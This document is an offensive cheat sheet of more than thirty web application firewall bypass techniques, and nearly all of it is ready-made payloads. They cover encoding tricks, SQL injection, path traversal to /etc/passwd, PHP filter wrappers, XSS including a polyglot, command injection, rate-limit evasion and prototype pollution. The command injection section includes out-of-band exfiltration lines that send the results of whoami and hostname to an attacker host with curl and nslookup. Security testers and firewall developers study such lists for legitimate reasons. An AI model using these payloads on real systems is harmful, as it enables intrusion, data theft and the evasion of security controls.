# WAF BYPASS — 30+ Techniques
## Last Updated: Mon Jul 06 2026

## 1. ENCODING BYPASSES
### URL Encoding
%2e%2e%2f → ../
%252e%252e%252f → double URL encoded ../
%25252e%25252e%25252f → triple URL encoded

### Unicode/UTF-8 Overlong
%c0%ae%c0%ae/ → ../ (overlong UTF-8)
%c0%ae%c0%ae%c0%af → ../ (overlong)

### UTF-16 / Unicode
%u002e%u002e%u002f → ../
%u2215 → / (alternative solidus)

### UTF-7
+ADw-script+AD4- → <script>
+AC4-+AC4-+AC8- → ../

### Double/Triple Encoding
%253c%2573%2563%2572%2569%2570%2574%253e → <script> (triple)
%2527 → ' (double)

### Mixed Case
<ScRiPt>SeLeCt UnIoN PrAdM
<script>SELECT UNION PRADM

### Null Byte
%00, %2500 — bypass extension filters
shell.php%00.jpg → WAF sees .jpg, PHP sees .php

### Whitespace Bypass
%09 (tab), %0a (newline), %0b, %0c, %0d, %a0 (nbsp)
1'%09OR%09'1'='1

## 2. HTTP METHOD BYPASS
### Method Confusion
GET → POST → PUT → PATCH → DELETE → OPTIONS → HEAD → TRACE → CONNECT

### Content-Type Switching
application/json → application/xml → text/plain → multipart/form-data
JSON: {"id":"1' OR '1'='1"}
XML: <id>1' OR '1'='1</id>
Form: id=1'+OR+'1'='1

### HTTP Parameter Pollution (HPP)
?id=1&id=2 (last/first wins?)
?id=1&id=1'+UNION&id=SELECT+1,2,3--

### HTTP Header Injection
X-Forwarded-For: 127.0.0.1 (IP rotation)
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Forwarded-Host: evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin

## 3. SQL INJECTION WAF BYPASS

### Comment Bypass
/**/ instead of space: 1'/**/OR/**/1=1
1'/*!OR*/1=1 (MySQL comment)
1'--+ (instead of #)

### Inline Comment
/*!50000SELECT*/ → version-specific code execution
/*!12345sElEcT*/ → case bypass with version comment

### Alternative operators
AND → &&, OR → ||, = → LIKE, IN, BETWEEN
1' || '1'='1' || '1'='1

### No-Comment Bypass
1' UNION SELECT 1,2,3 WHERE '1'='1
1' UNION SELECT 1,2,3 FROM users WHERE '1'='1

### Double-Dash Variations
--, --+, -- -, --%20, --%09, --%0a

### Hex/Char Encoding
SELECT X'61646d696e' → SELECT 'admin'
CHAR(97,100,109,105,110) → 'admin' (MySQL)
0x61646d696e → 'admin' (MySQL)

### Heavy Query / Time-Based
BENCHMARK(10000000,MD5(1)) instead of SLEEP(5)
(select*from(select+sleep(5))a)

## 4. LFI WAF BYPASS

### Path Traversal Encodings
....//....//....//etc/passwd
..\\..\\..\\..\\etc/passwd (IIS)
..%252f..%252f..%252fetc%252fpasswd (double URL)
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd (overlong)

### PHP Wrappers (Various Filters)
php://filter/read=convert.base64-encode/resource=index
php://filter/read=string.rot13/resource=index
php://filter/read=convert.iconv.utf-8.utf-16/resource=index
php://filter/read=zlib.deflate/convert.base64-encode/resource=index

### Null Byte (PHP < 5.3.4)
../../../etc/passwd%00

## 5. XSS WAF BYPASS

### Event Handler Variations
onclick, onload, onerror, onfocus, onmouseover, onsubmit, onchange
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>

### Protocol Bypass
javascript: → java%0ascri%0apt: → java&#115;cript:
data:text/html → data:text/html;base64,...

### No-Script XSS
<body background=javascript:alert(1)>
<object data=javascript:alert(1)>
<svg><script>alert(1)</script>

### Polyglot XSS
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//

## 6. COMMAND INJECTION BYPASS

### IO Redirection Bypass
1;id → 1|id → 1$(id) → 1`id` → 1||id → 1&&id

### Newline Injection
%0aid, %0d%0aid

### Blind Payload
1;sleep+5, |sleep+5, $(sleep+5)

### OOB Exfil
1;curl http://attacker/$(whoami)
1;nslookup $(hostname).attacker.com

## 7. Rate Limit Bypass
### Header Rotation Per Request
X-Forwarded-For: 192.168.1.1-255 (rotate)
X-Real-IP: rotate
User-Agent: rotate

### Cookie Clearing
Remove session cookies between requests

### Request Pipelining / Batching
GraphQL batching: one request with 1000 queries

## 8. Server-Side Prototype Pollution
__proto__[admin]=true
constructor[prototype][admin]=true
__proto__.toString=1

